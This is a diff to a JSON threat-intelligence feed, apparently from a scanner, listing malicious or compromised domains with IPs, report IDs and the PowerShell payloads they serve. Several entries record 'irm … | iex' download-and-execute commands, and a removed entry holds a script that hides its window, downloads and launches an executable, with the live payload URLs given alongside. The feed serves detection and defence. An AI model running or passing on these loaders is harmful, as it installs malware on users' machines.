@@ -1,5 +1,64 @@
 [
   {
+    "UrlDomain": "canconnectmedia.com",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "132.148.178.228"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwoauwbm1yu70oml45lo3jkx",
+    "ScannedAt": "2026-11-20T01:27:50.628000+00:00"
+  },
+  {
+    "UrlDomain": "mitsubishikimlienhanoi.vn",
+    "DeliveryUrl": [],
+    "PayloadUrl": [],
+    "IP": [
+      "36.50.26.24"
+    ],
+    "Related": [
+      {
+        "Value": "gitlab.com",
+        "Type": "payload download"
+      }
+    ],
+    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
+    "ResolvedDownloadUrl": [
+      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
+    ],
+    "ReportId": "cmwoarw6c1ytk0omlfgbkqvw7",
+    "ScannedAt": "2026-11-20T01:25:30.403000+00:00"
+  },
+  {
+    "UrlDomain": "zekoturizm.com",
+    "DeliveryUrl": [
+      "j7tracker.gb.net"
+    ],
+    "PayloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/f6e1bc839f837436"
+    ],
+    "IP": [
+      "37.18.61.132"
+    ],
+    "Related": [],
+    "Payload": "(irm 'https://j7tracker[.]gb[.]net/8pchkbdes5/f6e1bc839f837436')|iex",
+    "ResolvedDownloadUrl": [
+      "https://j7tracker.gb.net/8pchkbdes5/f6e1bc839f837436"
+    ],
+    "ReportId": "cmwo9kdgz1ys80omlr22sxrni",
+    "ScannedAt": "2026-11-20T00:51:39.997000+00:00"
+  },
+  {
     "UrlDomain": "jordan-commu.com",
     "DeliveryUrl": [
       "img-codes-cloude.info"
@@ -6538,24 +6597,5 @@
     ],
     "ReportId": "cmwk0sutc19dk0omldqs77qbt",
     "ScannedAt": "2026-11-17T01:35:14.437000+00:00"
-  },
-  {
-    "UrlDomain": "dghomes.properties",
-    "DeliveryUrl": [
-      "fbifr.com"
-    ],
-    "PayloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "IP": [
-      "156.67.74.40"
-    ],
-    "Related": [],
-    "Payload": "$url = \"https://fbifr[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
-    "ResolvedDownloadUrl": [
-      "https://fbifr.com/eoN"
-    ],
-    "ReportId": "cmwk0b89t19c30oml69o3fcb7",
-    "ScannedAt": "2026-11-17T01:21:32.121000+00:00"
   }
 ]
